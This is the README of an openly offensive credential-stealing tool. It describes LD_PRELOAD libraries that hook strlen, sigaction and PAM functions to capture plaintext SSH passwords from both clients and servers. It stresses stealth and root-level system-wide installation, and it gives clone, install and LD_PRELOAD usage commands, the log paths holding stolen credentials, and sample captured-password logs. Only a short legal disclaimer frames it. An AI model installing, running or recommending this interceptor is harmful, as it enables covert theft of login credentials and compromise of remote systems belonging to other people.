# Advanced SSH Password Interceptor

An enhanced tool for monitoring SSH authentication credentials in both client and server processes. This project intercepts SSH passwords without modifying SSH binaries, using a state machine approach for reliable detection.

## Features

- **Dual Mode Operation**: Captures passwords from both SSH client and server
- **Stealthy Operation**: Uses LD_PRELOAD for dynamic hooking without modifying SSH binaries
- **State Machine Design**: Reliable capture method adapts to different SSH session states
- **Automatic Process Detection**: Loader automatically detects SSH client and server processes
- **Easy Installation**: Simple installation script for system-wide deployment
- **Minimal Dependencies**: Uses only standard Linux libraries
- **Comprehensive Logging**: Detailed logs with timestamp, user, command, and success status

## Technical Details

This project consists of three main components:

1. **SSH Client Interceptor (`libssh_inject.so`)**: 
   - Hooks into `strlen()`, `sigaction()` and `exit()` functions
   - Uses a state machine to detect password entry and authentication result
   - Logs credentials from outgoing SSH connections

2. **SSH Server Interceptor (`libsshd_inject.so`)**: 
   - Hooks into PAM authentication functions (`pam_get_item()`, `pam_authenticate()`)
   - Captures usernames and passwords for incoming SSH connections
   - Logs failed and successful authentication attempts

3. **Automatic Loader (`libloader.so`)**: 
   - Detects process type and loads appropriate interceptor module
   - Provides universal functionality for both client and server processes
   - Minimal overhead for non-SSH processes

## Installation

### Prerequisites

- Linux system with glibc
- g++ compiler with C++11 support
- SSH client/server using PAM authentication
- Root access for system-wide installation

### Quick Install

```bash
# Clone the repository
git clone https://github.com/Personaz1/ScrScr.git
cd ScrScr

# Install (requires root)
sudo ./install.sh
```

### Manual Usage (Client Only)

For testing or using only the client component without root:

```bash
# Compile the client component
make -f ssh_inject.mk

# Use with a specific SSH command
LD_PRELOAD=./libssh_inject.so ssh user@server
```

## Log Files

The interceptor writes captured credentials to the following log files:

- **SSH Client**: `/tmp/ssh_inj.dbg`
- **SSH Server**: `/tmp/sshd_inj.dbg`
- **Loader**: `/tmp/ssh_loader.dbg`

Example client log output:
```
AUTH: pid=1234, user=localuser, cmdline=ssh remoteuser@server.com
[ + ] Injection started
... Password prompt detected
... sigaction(SIGTTOU) detected
... Password captured via strlen: "secretpassword"
[ + ] Captured:
    Date: Thu May 12 15:46:23 2022
    User: localuser
    Cmdline: ssh remoteuser@server.com
    Password: "secretpassword"
    Succeeded: 1
----
```

Example server log output:
```
[ + ] Server injection initialized (pid=5678)
... pam_get_item(PAM_AUTHTOK): remoteuser:secretpassword
... pam_authenticate(..) returned 0
[ + ] Captured:
    Date: Thu May 12 15:46:24 2022
    Username: remoteuser
    Password: "secretpassword"
    Succeeded: 1
----
```

## Uninstallation

```bash
sudo ./uninstall.sh
```

## Security Considerations

This tool is designed for legitimate security testing and system administration. Using it without proper authorization may violate laws and regulations. Always ensure you have permission before monitoring SSH sessions.

## Improvements Over Original Version

1. Added server-side interception for complete monitoring
2. Created automatic process detection for universal deployment
3. Improved memory management and error handling
4. Enhanced logging with more detailed information
5. Simplified installation and uninstallation
6. Added compatibility with modern OpenSSH versions

## License

This project is for educational purposes only. Use responsibly and ethically.

## Credits

Based on original work by Anonymous, significantly enhanced with additional features and improvements. 